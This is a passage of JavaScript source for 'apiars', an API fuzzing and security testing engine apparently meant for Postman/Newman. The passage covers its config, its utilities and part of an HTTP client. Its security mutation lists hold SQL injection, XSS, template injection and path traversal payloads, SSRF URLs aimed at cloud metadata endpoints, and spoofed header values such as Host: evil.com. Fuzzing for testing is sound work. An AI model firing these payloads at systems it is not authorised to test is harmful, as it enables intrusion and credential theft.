/*!
 * apiars — API Fuzzing & Security Engine
 * 
 * Copyright (c) 2026 Mikhail A. Ivlev (Ивлев Михаил Александрович)
 * 
 * Licensed under the GNU Affero General Public License v3.0 (AGPL-3.0).
 * You may obtain a copy of the License at:
 *     https://www.gnu.org/licenses/agpl-3.0.html
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU Affero General Public License for more details.
 * 
 * IMPORTANT - NETWORK USE PROVISION (AGPL Section 13):
 * If you modify this software and provide it to users over a network
 * (including as a web service, SaaS, or API), you MUST make the complete
 * corresponding source code of your modified version available to those
 * users under AGPL-3.0 terms.
 * 
 * This means:
 * - Cloud providers (AWS, Azure, GCP) must disclose modifications
 * - SaaS companies must provide source code to their users
 * - Internal corporate use does NOT trigger this requirement
 * 
 * TRADEMARK NOTICE:
 * The name "apiars" is a trademark of Mikhail A. Ivlev.
 * Use of this name in product names, services, or domains requires
 * explicit written permission. See NOTICE file for details.
 * 
 * COMMERCIAL LICENSING:
 * If AGPL-3.0 obligations conflict with your business model,
 * commercial licenses are available that remove these requirements.
 * 
 * Contact: apiars.dev@gmail.com
 * 
 * @version 24.1.0
 * @author Mikhail A. Ivlev (Ивлев Михаил Александрович)
 * @license AGPL-3.0
 * @see https://github.com/apiars/apiars
 * @see https://www.gnu.org/licenses/agpl-3.0.html
 */

const ENGINE_VERSION = '24.1.0';

// Runtime Detection
const hasPm = typeof pm !== 'undefined';
const hasProcess = typeof process !== 'undefined';

const detectNewman = function() {
    if (!hasProcess) return false;
    if (process.env.NEWMAN) return true;
    if (process.argv && process.argv.some(arg => arg.includes('newman'))) return true;
    if (process.env.CI || process.env.GITHUB_ACTIONS || process.env.GITLAB_CI) return true;
    return false;
};

// Security Tests Opt-In Check
const isSecurityTestsEnabled = function() {
    // Security tests require explicit opt-in via environment variable
    if (!hasProcess || !process.env) return false;
    return process.env.ENABLE_SECURITY_TESTS === 'true';
};

const RUNTIME = Object.freeze({
    isNewman: detectNewman(),
    isCollectionRunner: hasPm && typeof pm.info !== 'undefined' && typeof pm.info.iteration === 'number',
    isPostmanUI: hasPm && (!hasProcess || !process.env.NEWMAN),
    hasPm: hasPm
});

// Memory Limits
const MEMORY_LIMITS = Object.freeze({
    maxCollectNodesSize: RUNTIME.isNewman ? 3000 : 5000,
    maxCollectDepth: 50,
    maxWarningsSize: RUNTIME.isNewman ? 50 : 100,
    maxSignatureCacheSize: RUNTIME.isNewman ? 500 : 1000,
    maxBugClustersSize: RUNTIME.isNewman ? 250 : 500,
    maxResponseBodySize: 1024 * 1024,
    maxTotalRequests: RUNTIME.isNewman ? 3500 : 5000,
    maxPayloadSize: 10 * 1024 * 1024
});

// Security Config
const SECURITY_CONFIG = Object.freeze({
    enabled: true,
    maskInLogs: true,
    sensitivePatterns: Object.freeze([
        'token', 'secret', 'password', 'key', 'authorization',
        'cookie', 'api-key', 'apikey', 'auth', 'bearer'
    ]),
    maskChar: '*',
    maskLength: 8
});

// Main Config
const CONFIG = Object.freeze({
    targetPathsKeys: [],
    targetPathsPrefixMatch: false,
    
    logDumpJsonLogs: false,
    logShowResponse: true,
    logDetailedSteps: false,
    
    delayMs: 1000,
    globalTimeoutMs: 1800000,
    requestTimeoutMs: 60000,
    
    features: Object.freeze({
        abortFast: true,
        postmanTest: true,
        telemetry: false,
        securityTests: isSecurityTestsEnabled()
    }),
    
    stages: Object.freeze({
        baseline: true,
        fuzz: true,
        singleDelete: true,
        cumulativeDelete: true
    }),
    
    fuzzing: Object.freeze({
        usePolicies: ['light', 'heavy', 'security'],
        typeAwareness: true,
        fuzzObjects: true,
        fuzzArrays: true
    }),
    
    mutationPolicies: Object.freeze({
    // ========================================================================
    // 🟢 LIGHT - Basic contract tests (always enabled)
    // ========================================================================        
        light: Object.freeze([
        // --- Type Confusion ---
        null,           // 🔥🔥🔥 null vs undefined, null coercion
        true,           // 🔥🔥🔥 boolean vs number/string
        false,          // 🔥🔥🔥 falsy value handling
        
        // --- Numeric Boundaries ---
        0,              // 🔥🔥🔥 division by zero, falsy, auth bypass
        1,              // 🔥 baseline for comparisons
        -1,             // 🔥🔥🔥 array underflow, enum edge case
        
        // --- String Edges ---
        "",             // 🔥🔥🔥 empty ≠ null
        " ",            // 🔥🔥🔥 trim bypass (whitespace-only)
        "\n",           // 🔥🔥 newline / log injection
        "\t"            // 🔥 tab character (often missed by trim)
    ]),

    // ========================================================================
    // 🟡 HEAVY - Boundary testing (enabled in full mode)
    // ========================================================================
        heavy: Object.freeze([
        // --- Length Boundaries ---
        "A".repeat(255),    // 🔥🔥🔥 VARCHAR(255) boundary
        "A".repeat(256),    // 🔥🔥🔥 off-by-one overflow
        "A".repeat(1024),   // 🔥🔥 application/gateway limits
        "A".repeat(5000),   // 🔥 DoS / payload size test
        "A".repeat(65535),  // 🔥 16-bit integer boundary
        
        // --- Numeric Extremes ---
        1e+308,         // 🔥🔥 max double (near Infinity)
        -1e+308,        // 🔥 min double (near -Infinity)
        
        // --- Structural Confusion (JSON-safe) ---
        [],             // 🔥🔥🔥 array vs scalar
        {},             // 🔥🔥🔥 object vs primitive
        [null],         // 🔥🔥 array containing null
        [[]],           // 🔥 nested empty array
        {"": ""},       // 🔥 empty key-value
        
        // --- String Masquerading ---
        "null",         // 🔥🔥🔥 string "null" vs null
        "true",         // 🔥🔥 boolean coercion test
        "false",        // 🔥🔥 boolean coercion test
        "0",            // 🔥🔥🔥 truthy/falsy bypass
        "1",            // 🔥 numeric string comparison
        "0.0",          // 🔥 normalization test
        "-0",           // 🔥 negative zero edge case
        "1e308",        // 🔥 scientific notation as string
        
        // --- Unicode/Encoding ---
        "\uFEFF",       // 🔥 BOM (Byte Order Mark)
        "I\u0307",      // 🔥 Unicode normalization (İ vs I)
        "\u202E",       // 🔥 RTL override (spoofing)
        
        // --- Line Endings ---
        "\r\n",         // 🔥 Windows CRLF
        "  "            // 🔥 Multiple spaces
    ]),

    // ========================================================================
    // 🔴 SECURITY - Specialized attacks (separate category)
    // ======================================================================== 
        security: Object.freeze([
        // --- Business Logic ---
        "admin",        // 🔥🔥🔥 role confusion
        "root",         // 🔥🔥🔥 hardcoded superuser
        
        // --- UUID/ID Edges ---
        "00000000-0000-0000-0000-000000000000", // 🔥🔥🔥 nil UUID
        
        // --- Email Validation ---
        "test@",        // 🔥🔥 broken email format
        "not-an-email@", // 🔥🔥 email validator bypass
        
        // --- Date/Time Edges ---
        "2025-13-45",   // 🔥 invalid date
        "0000-01-01",   // 🔥 epoch edge
        "1970-01-01T00:00:00Z", // 🔥 Unix epoch
        "9999-12-31",   // 🔥 max date boundary
        
        // --- Template Injection (SSTI) ---
        "{{7*7}}",      // 🔥🔥🔥 Handlebars/Jinja2
        "${7*7}",       // 🔥🔥🔥 JavaScript/Spring EL
        "#{7*7}",       // 🔥🔥 Ruby/Freemarker
        
        // --- SQL Injection (safe variants) ---
        "' OR '1'='1",  // 🔥🔥🔥 basic auth bypass
        "admin'--",     // 🔥🔥🔥 comment truncation
        
        // --- XSS (safe variants) ---
        "<script>alert(1)</script>", // 🔥🔥🔥 basic XSS
        "<img src=x onerror=alert(1)>", // 🔥🔥🔥 event handler
        
        // --- Path/File Injection ---
        "../../../../etc/passwd",   // 🔥🔥🔥 path traversal
        "..\\..\\..\\windows\\win.ini", // 🔥🔥🔥 Windows variant
        
        // --- SSRF ---
        "http://169.254.169.254/latest/meta-data/", // 🔥🔥🔥 AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/", // 🔥🔥🔥 GCP
        "http://localhost:80" // 🔥🔥 localhost bypass
    ]),

    // ========================================================================
    // 🔵 OBJECT/ARRAY MUTATIONS (for structural tests)
    // ========================================================================
        objectMutations: Object.freeze([
        {},             // 🔥🔥🔥 empty object
        null,           // 🔥🔥🔥 object → null
        {"key": "value"}, // 🔥 unexpected structure
        {"": ""},       // 🔥 empty key
        {"a": null}     // 🔥🔥 null property value
    ]),
        arrayMutations: Object.freeze([
        [],             // 🔥🔥🔥 empty array
        null,           // 🔥🔥🔥 array → null
        [[]],           // 🔥 nested empty
        [null],         // 🔥🔥 null element
        [{}],           // 🔥 object in array
        [""],           // 🔥 empty string element
        [0]             // 🔥 zero element
    ])
    }),
    
    jwtConfig: Object.freeze({
        enabled: true,
        testAlgorithmNone: true,
        testSignatureRemoval: true,
        testPayloadTampering: true,
        testExpiredToken: true,
        claimsToTamper: ['sub', 'user_id', 'role', 'admin', 'email', 'scope'],
        adminValues: ['admin', 'administrator', 'root', 'superuser']
    }),
    
    paginationConfig: Object.freeze({
        enabled: true,
        keywords: ['limit', 'size', 'page', 'offset', 'count', 'per_page', 'skip', 'take'],
        testValues: [0, -1, -100, 9999999, 999999999, 1, "null", "undefined", "NaN", "''", "0x0", "1e10"]
    }),
    
    headerInjectionConfig: Object.freeze({
        enabled: true,
        injections: Object.freeze([
            {'X-HTTP-Method-Override': 'DELETE'},
            {'X-HTTP-Method-Override': 'PUT'},
            {'X-Method-Override': 'PATCH'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': 'localhost'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'Host': 'evil.com'},
            {'X-Forwarded-Host': 'evil.com'},
            {'X-User-Role': 'admin'},
            {'X-Admin': 'true'},
            {'X-Internal': 'true'},
            {'X-Authenticated': 'true'}
        ])
    }),
    
    graphqlConfig: Object.freeze({
        enabled: true,
        introspectionEnabled: true,
        testDeepNesting: true,
        testBatching: true,
        maxQueryDepth: 10,
        maxBatchSize: 100
    }),
    
    xmlConfig: Object.freeze({
        enabled: true,
        enableXXE: true,
        testFileRead: true,
        testSSRF: true,
        testDoS: true
    }),
    
    stage3Config: Object.freeze({
        maxCombinations: 20,
        startWithPairs: true,
        maxFieldsPerCombo: 5
    }),
    
    abortFast: Object.freeze({
        sameError: 5,
        serverCrash: 3,
        totalConsecutive: 10
    }),
    
    circuitBreaker: Object.freeze({
        serviceUnavailable: 10,
        tooManyRequests: 5,
        pauseDurationMs: 30000,
        enabled: true
    }),
    
    errorClassifiers: Object.freeze({
        serverCrash: [/crash|fatal|segfault|panic/i, /500|502|503/],
        validation: [/validation|invalid|malformed/i, /400|422/],
        auth: [/unauthorized|forbidden|token/i, /401|403/],
        notFound: [/not found|does not exist/i, /404/]
    }),
    
    networkRetry: Object.freeze({
        enabled: true,
        maxRetries: 1,
        retryCodes: Object.freeze([0, 408, 502, 503, 504]),
        retryErrors: Object.freeze(['ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND', 'EPIPE']),
        baseDelayMs: 2000,
        jitterFactor: 0.3
    }),
    
    rateLimit: Object.freeze({
        enabled: true,
        delayMs: 50,
        burstLimit: 10,
        burstWindowMs: 1000
    }),
    
    strictVariables: true
});

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { ENGINE_VERSION, RUNTIME, MEMORY_LIMITS, SECURITY_CONFIG, CONFIG };
}

console.log(`✅ Config v${ENGINE_VERSION} - All configs restored + security tests enabled`);

// ============================================================================
// ENGINE v24.1.0 - Module 02: Utilities
// ============================================================================

// Dynamic Variables List
const DYNAMIC_VARIABLES = [
        '$guid', '$timestamp', '$isoTimestamp', '$randomUUID',
        '$randomAlphaNumeric', '$randomBoolean', '$randomInt',
        '$randomColor', '$randomHexColor', '$randomAbbreviation',
        '$randomIP', '$randomIPV6', '$randomMACAddress',
        '$randomPassword', '$randomLocale', '$randomUserAgent',
        '$randomProtocol', '$randomSemver', '$randomFirstName',
        '$randomLastName', '$randomFullName', '$randomNamePrefix',
        '$randomNameSuffix', '$randomJobArea', '$randomJobDescriptor',
        '$randomJobTitle', '$randomJobType', '$randomPhoneNumber',
        '$randomPhoneNumberExt', '$randomCity', '$randomStreetName',
        '$randomStreetAddress', '$randomCountry', '$randomCountryCode',
        '$randomLatitude', '$randomLongitude', '$randomAvatars',
        '$randomImageUrl', '$randomAbstractImage', '$randomAnimalsImage',
        '$randomBusinessImage', '$randomCatsImage', '$randomFoodImage',
        '$randomNightlifeImage', '$randomFashionImage', '$randomPeopleImage',
        '$randomNatureImage', '$randomSportsImage', '$randomTransportImage',
        '$randomImageDataUri', '$randomBankAccount', '$randomBankAccountName',
        '$randomCreditCardMask', '$randomBankAccountBic', '$randomBankAccountIban',
        '$randomTransactionType', '$randomCurrencyCode', '$randomCurrencyName',
        '$randomCurrencySymbol', '$randomBitcoin', '$randomCompanyName',
        '$randomCompanySuffix', '$randomBs', '$randomBsAdjective',
        '$randomBsBuzz', '$randomBsNoun', '$randomCatchPhrase',
        '$randomCatchPhraseAdjective', '$randomCatchPhraseDescriptor',
        '$randomCatchPhraseNoun', '$randomDatabaseColumn', '$randomDatabaseType',
        '$randomDatabaseCollation', '$randomDatabaseEngine', '$randomDateFuture',
        '$randomDatePast', '$randomDateRecent', '$randomWeekday',
        '$randomMonth', '$randomDomainName', '$randomDomainSuffix',
        '$randomDomainWord', '$randomEmail', '$randomExampleEmail',
        '$randomUserName', '$randomUrl', '$randomFileName', '$randomFileType',
        '$randomFileExt', '$randomCommonFileName', '$randomCommonFileType',
        '$randomCommonFileExt', '$randomFilePath', '$randomDirectoryPath',
        '$randomMimeType', '$randomPrice', '$randomProduct', '$randomProductAdjective',
        '$randomProductMaterial', '$randomProductName', '$randomDepartment',
        '$randomVerb', '$randomIngVerb', '$randomAdjective', '$randomNoun',
        '$randomWords', '$randomPhrase', '$randomLoremWord', '$randomLoremWords',
        '$randomLoremSentence', '$randomLoremSentences', '$randomLoremParagraph',
        '$randomLoremParagraphs', '$randomLoremText', '$randomLoremSlug',
        '$randomLoremLines'
    ];

// Enhanced comment removal
const removeComments = function(raw) {
    let result = '';
    let inString = false;
    let stringChar = '';
    let escaped = false;
    
    for (let i = 0; i < raw.length; i++) {
        const char = raw[i];
        const next = raw[i + 1];
        
        if (escaped) {
            result += char;
            escaped = false;
            continue;
        }
        
        if (char === '\\' && inString) {
            result += char;
            escaped = true;
            continue;
        }
        
        if ((char === '"' || char === "'") && !inString) {
            inString = true;
            stringChar = char;
            result += char;
            continue;
        }
        
        if (char === stringChar && inString) {
            inString = false;
            stringChar = '';
            result += char;
            continue;
        }
        
        if (inString) {
            result += char;
            continue;
        }
        
        // Remove /* */ comments
        if (char === '/' && next === '*') {
            let j = i + 2;
            while (j < raw.length - 1 && !(raw[j] === '*' && raw[j + 1] === '/')) {
                j++;
            }
            i = j + 1;
            continue;
        }
        
        // Remove // comments
        if (char === '/' && next === '/') {
            let j = i + 2;
            while (j < raw.length && raw[j] !== '\n' && raw[j] !== '\r') {
                j++;
            }
            i = j - 1;
            continue;
        }
        
        result += char;
    }
    
    // Detect and fix double quotes syntax errors
    result = result.replace(/""([,\}\]])/g, '"$1');
    
    return result;
};

// CRITICAL FIX: Restored v24 logic (NO isDynamic check)
const escapeUnquotedTemplates = function(raw) {
    let result = '';
    let inString = false;
    let stringChar = '';
    let escaped = false;
    let i = 0;
    const MARKER_UNQ = "__UNQ_TPL__";
    
    while (i < raw.length) {
        const char = raw[i];
        
        if (escaped) {
            result += char;
            escaped = false;
            i++;
            continue;
        }
        
        if (char === '\\') {
            result += char;
            if (inString) escaped = true;
            i++;
            continue;
        }
        
        if ((char === '"' || char === "'") && !escaped) {
            if (!inString) {
                inString = true;
                stringChar = char;
            } else if (char === stringChar) {
                inString = false;
            }
            result += char;
            i++;
            continue;
        }
        
        if (inString) {
            result += char;
            i++;
            continue;
        }
        
        // CRITICAL FIX: Wrap ALL templates (both static and dynamic)
        if (char === '{' && raw[i + 1] === '{') {
            let j = i;
            let depth = 0;
            
            while (j < raw.length && raw[j] === '{') {
                depth++;
                j++;
            }
            
            let closingDepth = 0;
            let foundEnd = false;
            
            while (j < raw.length) {
                if (raw[j] === '}') {
                    closingDepth++;
                    if (closingDepth === depth) {
                        foundEnd = true;
                        j++;
                        break;
                    }
                } else {
                    closingDepth = 0;
                }
                j++;
            }
            
            if (foundEnd) {
                result += `"${MARKER_UNQ}${raw.substring(i, j)}"`;
                i = j;
                continue;
            } else {
                console.warn('⚠️ Unclosed braces at position ' + i);
                result += raw.substring(i);
                break;
            }
        }
        
        result += char;
        i++;
    }
    
    return result;
};

// Deep Copy with circular reference protection
const deepCopy = function(obj, visited) {
    visited = visited || new WeakMap();
    
    if (obj === null || typeof obj !== 'object') return obj;
    
    if (visited.has(obj)) {
        console.warn('⚠️ Circular reference detected in deepCopy');
        return null;
    }
    
    if (obj instanceof Date) return new Date(obj);
    
    if (obj instanceof Array) {
        visited.set(obj, true);
        const copy = [];
        for (let i = 0; i < obj.length; i++) {
            copy[i] = deepCopy(obj[i], visited);
        }
        return copy;
    }
    
    if (obj instanceof Object) {
        visited.set(obj, true);
        const copy = {};
        for (const key in obj) {
            if (obj.hasOwnProperty(key)) {
                copy[key] = deepCopy(obj[key], visited);
            }
        }
        return copy;
    }
    
    return obj;
};

// Utility Functions
const Utils = {
    removeComments: removeComments,
    escapeUnquotedTemplates: escapeUnquotedTemplates,
    deepCopy: deepCopy,
    
    delay: ms => new Promise(r => setTimeout(r, ms)),
    
    warn: function(msg) {
        console.warn(`⚠️ ${msg}`);
    },
    
    safeStringify: function(obj, maxLength) {
        maxLength = maxLength || 10000;
        try {
            const str = JSON.stringify(obj);
            return str.length > maxLength ? str.substring(0, maxLength) + '...' : str;
        } catch (e) {
            return '[Circular or Invalid]';
        }
    },
    
    hashDJB2: function(str) {
        let hash = 5381;
        for (let i = 0; i < str.length; i++) {
            hash = ((hash << 5) + hash) + str.charCodeAt(i);
        }
        return (hash >>> 0).toString(36);
    },
    
    computePayloadHash: function(obj) {
        try {
            const str = this.safeStringify(obj);
            return this.hashDJB2(str);
        } catch {
            return 'HASH_ERROR_' + Date.now();
        }
    },
    
    sortBottomUp: function(nodes) {
        return [...nodes].sort((a, b) => {
            if (a.path.length !== b.path.length) {
                return b.path.length - a.path.length;
            }
            return a.pathStr.localeCompare(b.pathStr);
        });
    },
    
    isAllowed: function(pathArr, CONFIG) {
        if (!CONFIG.targetPathsKeys || CONFIG.targetPathsKeys.length === 0) {
            return true;
        }
        
        const pathStr = Array.isArray(pathArr) ? pathArr.join('.') : String(pathArr);
        
        if (CONFIG.targetPathsPrefixMatch) {
            return CONFIG.targetPathsKeys.some(key => 
                pathStr === key || pathStr.startsWith(key + '.')
            );
        } else {
            return CONFIG.targetPathsKeys.includes(pathStr);
        }
    },
    
    isObject: function(val) {
        return val !== null && typeof val === 'object' && !Array.isArray(val);
    },
    
    truncateString: function(str, maxLen) {
        maxLen = maxLen || 200;
        if (!str) return str;
        return str.length > maxLen ? str.slice(0, maxLen) + '...' : str;
    }
};

// Advanced Utility Functions
const checkGlobalTimeout = function(stats, CONFIG) {
    if (typeof stats === 'undefined' || !stats || !stats.startTime) return false;
    
    const elapsed = Date.now() - stats.startTime;
    if (elapsed > CONFIG.globalTimeoutMs) {
        stats.abortReasons = stats.abortReasons || [];
        stats.abortReasons.push(`Global timeout (${CONFIG.globalTimeoutMs}ms)`);
        return true;
    }
    
    return false;
};

const checkCircuitBreaker = function(stats, CONFIG) {
    if (typeof stats === 'undefined' || !stats) return false;
    
    const svcCount = (stats.codes['503'] || 0) + (stats.codes['502'] || 0) + (stats.codes['504'] || 0);
    const rateLimitCount = stats.codes['429'] || 0;
    
    if (svcCount >= CONFIG.circuitBreaker.serviceUnavailable) {
        stats.abortReasons = stats.abortReasons || [];
        stats.abortReasons.push(`Circuit breaker: Service unavailable ×${svcCount}`);
        return true;
    }
    
    if (rateLimitCount >= CONFIG.circuitBreaker.tooManyRequests) {
        stats.abortReasons = stats.abortReasons || [];
        stats.abortReasons.push(`Circuit breaker: Rate limited ×${rateLimitCount}`);
        return true;
    }
    
    return false;
};

const CacheCleaner = {
    clean: function(stats, MEMORY_LIMITS) {
        if (typeof stats === 'undefined' || !stats) return;
        
        if (stats.signatureCache && stats.signatureCache.size > MEMORY_LIMITS.maxSignatureCacheSize) {
            const toDelete = stats.signatureCache.size - Math.floor(MEMORY_LIMITS.maxSignatureCacheSize * 0.8);
            let deleted = 0;
            
            for (const key of stats.signatureCache.keys()) {
                if (deleted >= toDelete) break;
                stats.signatureCache.delete(key);
                deleted++;
            }
            
            console.log(`🧹 Cache cleaned: removed ${deleted} signatures`);
        }
        
        if (stats.bugClusters && stats.bugClusters.size > MEMORY_LIMITS.maxBugClustersSize) {
            const toDelete = stats.bugClusters.size - Math.floor(MEMORY_LIMITS.maxBugClustersSize * 0.8);
            let deleted = 0;
            
            for (const key of stats.bugClusters.keys()) {
                if (deleted >= toDelete) break;
                stats.bugClusters.delete(key);
                deleted++;
            }
            
            console.log(`🧹 Bug clusters cleaned: removed ${deleted} clusters`);
        }
    }
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { 
        DYNAMIC_VARIABLES, 
        Utils, 
        checkGlobalTimeout, 
        checkCircuitBreaker, 
        CacheCleaner 
    };
}

console.log('✅ Utils v24.1.0 - CRITICAL FIX: escapeUnquotedTemplates() restored');

// ============================================================================
// ENGINE v24.1.0 - Module 03: Data Providers
// ============================================================================

// JSON Provider with proper array/object handling
const createJSONProvider = function() {
    return {
        name: 'JSON',
        
        collectNodes: function(obj, path, pathStr, depth, visited, MEMORY_LIMITS) {
            path = path || [];
            pathStr = pathStr || '';
            depth = depth || 0;
            visited = visited || new WeakSet();
            MEMORY_LIMITS = MEMORY_LIMITS || { maxCollectDepth: 50, maxCollectNodesSize: 5000 };
            
            const nodes = [];
            
            // Depth protection
            if (depth > MEMORY_LIMITS.maxCollectDepth) {
                console.warn(`⚠️ Max depth ${MEMORY_LIMITS.maxCollectDepth} reached at: ${pathStr || '(root)'}`);
                return nodes;
            }
            
            // Primitive values
            if (obj === null || typeof obj !== 'object') {
                nodes.push({
                    path: path.slice(),
                    pathStr: pathStr || '(root)',
                    value: obj,
                    valueType: 'primitive',
                    depth: depth
                });
                return nodes;
            }
            
            // Circular reference protection
            if (visited.has(obj)) {
                console.warn(`⚠️ Circular reference detected at: ${pathStr || '(root)'}`);
                return nodes;
            }
            visited.add(obj);
            
            // Arrays
            if (Array.isArray(obj)) {
                // Only add array node if NOT root
                if (path.length > 0) {
                    nodes.push({
                        path: path.slice(),
                        pathStr: pathStr,
                        value: obj,
                        valueType: 'array',
                        depth: depth
                    });
                }
                
                // Process array elements with DOT notation
                for (let i = 0; i < obj.length; i++) {
                    const childPath = path.concat(i);
                    const childPathStr = pathStr ? `${pathStr}.${i}` : `${i}`;
                    
                    const childNodes = this.collectNodes(
                        obj[i], childPath, childPathStr, 
                        depth + 1, visited, MEMORY_LIMITS
                    );
                    nodes.push(...childNodes);
                }
                
            } else {
                // Objects
                // Only add object node if NOT root
                if (path.length > 0) {
                    nodes.push({
                        path: path.slice(),
                        pathStr: pathStr,
                        value: obj,
                        valueType: 'object',
                        depth: depth
                    });
                }
                
                // Process object properties
                for (const key in obj) {
                    if (obj.hasOwnProperty(key)) {
                        const childPath = path.concat(key);
                        const childPathStr = pathStr ? `${pathStr}.${key}` : key;
                        
                        const childNodes = this.collectNodes(
                            obj[key], childPath, childPathStr, 
                            depth + 1, visited, MEMORY_LIMITS
                        );
                        nodes.push(...childNodes);
                    }
                }
            }
            
            // Memory protection
            if (nodes.length > MEMORY_LIMITS.maxCollectNodesSize) {
                console.warn(`⚠️ Truncating nodes from ${nodes.length} to ${MEMORY_LIMITS.maxCollectNodesSize}`);
                return nodes.slice(0, MEMORY_LIMITS.maxCollectNodesSize);
            }
            
            return nodes;
        },
        
        deleteByPath: function(obj, path) {
            if (!path || path.length === 0) return false;
            
            let current = obj;
            for (let i = 0; i < path.length - 1; i++) {
                current = current[path[i]];
                if (current === undefined || current === null) return false;
            }
            
            const key = path[path.length - 1];
            
            if (Array.isArray(current)) {
                if (typeof key === 'number' && key >= 0 && key < current.length) {
                    current.splice(key, 1);
                    return true;
                }
            } else {
                if (key in current) {
                    delete current[key];
                    return true;
                }
            }
            
            return false;
        },
        
        setByPath: function(obj, path, value) {
            if (!path || path.length === 0) return false;
            
            let current = obj;
            for (let i = 0; i < path.length - 1; i++) {
                current = current[path[i]];
                if (current === undefined || current === null) {
                    return false;
                }
            }
            
            current[path[path.length - 1]] = value;
            return true;
        },
        
        compact: function(obj) {
            if (Array.isArray(obj)) {
                return obj.map(item => this.compact(item));
            }
            if (obj !== null && typeof obj === 'object') {
                const result = {};
                for (const key in obj) {
                    if (obj.hasOwnProperty(key)) {
                        result[key] = this.compact(obj[key]);
                    }
                }
                return result;
            }
            return obj;
        }
    };
};

// FormData Provider
const createFormDataProvider = function() {
    return {
        name: 'FormData',
        
        collectNodes: function(formDataArray) {
            const nodes = [];
            
            if (!Array.isArray(formDataArray)) {
                console.warn('⚠️ FormData expected array, got:', typeof formDataArray);
                return nodes;
            }
            
            for (let i = 0; i < formDataArray.length; i++) {
                const item = formDataArray[i];
                
                if (!item || !item.key) continue;
                
                nodes.push({
                    path: [i],
                    pathStr: item.key,
                    value: item.value,
                    valueType: 'primitive',
                    formDataType: item.type || 'text',
                    depth: 0
                });
            }
            
            return nodes;
        },
        
        deleteByPath: function(formDataArray, path) {
            if (!Array.isArray(formDataArray) || !path || path.length === 0) return false;
            
            const index = path[0];
            if (typeof index === 'number' && index >= 0 && index < formDataArray.length) {
                formDataArray.splice(index, 1);
                return true;
            }
            
            return false;
        },
        
        setByPath: function(formDataArray, path, value) {
            if (!Array.isArray(formDataArray) || !path || path.length === 0) return false;
            
            const index = path[0];
            if (typeof index === 'number' && index >= 0 && index < formDataArray.length) {
                formDataArray[index].value = value;
                return true;
            }
            
            return false;
        },
        
        compact: function(formDataArray) {
            return formDataArray;
        }
    };
};

// URLEncoded Provider
const createURLEncodedProvider = function() {
    return {
        name: 'URLEncoded',
        
        collectNodes: function(urlencodedArray) {
            const nodes = [];
            
            if (!Array.isArray(urlencodedArray)) {
                console.warn('⚠️ URLEncoded expected array, got:', typeof urlencodedArray);
                return nodes;
            }
            
            for (let i = 0; i < urlencodedArray.length; i++) {
                const item = urlencodedArray[i];
                
                if (!item || !item.key) continue;
                
                nodes.push({
                    path: [i],
                    pathStr: item.key,
                    value: item.value,
                    valueType: 'primitive',
                    depth: 0
                });
            }
            
            return nodes;
        },
        
        deleteByPath: function(urlencodedArray, path) {
            if (!Array.isArray(urlencodedArray) || !path || path.length === 0) return false;
            
            const index = path[0];
            if (typeof index === 'number' && index >= 0 && index < urlencodedArray.length) {
                urlencodedArray.splice(index, 1);
                return true;
            }
            
            return false;
        },
        
        setByPath: function(urlencodedArray, path, value) {
            if (!Array.isArray(urlencodedArray) || !path || path.length === 0) return false;
            
            const index = path[0];
            if (typeof index === 'number' && index >= 0 && index < urlencodedArray.length) {
                urlencodedArray[index].value = value;
                return true;
            }
            
            return false;
        },
        
        compact: function(urlencodedArray) {
            return urlencodedArray;
        }
    };
};

// GraphQL Provider (uses JSON provider)
const createGraphQLProvider = function() {
    const jsonProvider = createJSONProvider();
    
    return {
        name: 'GraphQL',
        
        collectNodes: function(graphqlObj, path, pathStr, depth, visited, MEMORY_LIMITS) {
            return jsonProvider.collectNodes(graphqlObj, path, pathStr, depth, visited, MEMORY_LIMITS);
        },
        
        deleteByPath: function(obj, path) {
            return jsonProvider.deleteByPath(obj, path);
        },
        
        setByPath: function(obj, path, value) {
            return jsonProvider.setByPath(obj, path, value);
        },
        
        compact: function(obj) {
            return jsonProvider.compact(obj);
        }
    };
};

// XML Provider
const createXMLProvider = function() {
    return {
        name: 'XML',
        
        collectNodes: function() {
            return [];
        },
        
        deleteByPath: function() {
            return false;
        },
        
        setByPath: function() {
            return false;
        },
        
        compact: function(xml) {
            return xml;
        }
    };
};

// Factory
const DataProviderFactory = {
    create: function(type) {
        switch (type) {
            case 'json':
                return createJSONProvider();
            case 'formdata':
                return createFormDataProvider();
            case 'urlencoded':
                return createURLEncodedProvider();
            case 'graphql':
                return createGraphQLProvider();
            case 'xml':
                return createXMLProvider();
            default:
                return createJSONProvider();
        }
    }
};

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { DataProviderFactory };
}

console.log('✅ Data Providers v24.1.0 - Proper array/object handling');

// ============================================================================
// ENGINE v24.1.0 - Module 04: HTTP Client & Postman Adapter
// ============================================================================

// Rate Limiter
const createRateLimiter = function(CONFIG) {
    const queue = [];
    let lastRequest = 0;
    
    return {
        wait: async function() {
            if (!CONFIG.rateLimit.enabled) return;
            
            const now = Date.now();
            const filtered = queue.filter(t => now - t < CONFIG.rateLimit.burstWindowMs);
            queue.length = 0;
            queue.push(...filtered);
            
            if (queue.length >= CONFIG.rateLimit.burstLimit) {
                const delay = CONFIG.rateLimit.burstWindowMs - (now - queue[0]);
                await new Promise(r => setTimeout(r, Math.max(0, delay)));
            }
            
            const timeSinceLast = Date.now() - lastRequest;
            if (timeSinceLast < CONFIG.rateLimit.delayMs) {
                await new Promise(r => setTimeout(r, CONFIG.rateLimit.delayMs - timeSinceLast));
            }
            
            lastRequest = Date.now();
            queue.push(lastRequest);
        },
        
        reset: function() {
            queue.length = 0;
            lastRequest = 0;
        }
    };
};

// HTTP Client with improved retry
const createHttpClient = function(CONFIG) {
    const calculateRetryDelay = function(attempt) {
        const baseDelay = CONFIG.networkRetry.baseDelayMs;
        const exponentialDelay = baseDelay * Math.pow(2, attempt);
        const maxDelay = 10000;
        const cappedDelay = Math.min(exponentialDelay, maxDelay);
        const jitter = cappedDelay * CONFIG.networkRetry.jitterFactor * (Math.random() - 0.5) * 2;
        return Math.floor(cappedDelay + jitter);
    };
    
    const isRetryableError = function(error) {
        if (!error) return false;
